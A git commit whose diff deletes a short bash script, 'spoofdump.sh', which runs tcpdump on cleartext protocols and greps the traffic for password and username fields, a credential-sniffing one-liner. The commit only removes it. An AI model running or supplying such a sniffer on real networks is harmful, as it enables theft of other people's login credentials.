35645d00ce30f04385e361b1af819fec972c4fa5
sosokill <77854872+sosokill59@users.noreply.github.com>
2021-09-04 14:07:42 +0000

    Delete spoofdump.sh

--- spoofdump.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-
-tcpdump -n port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|user'
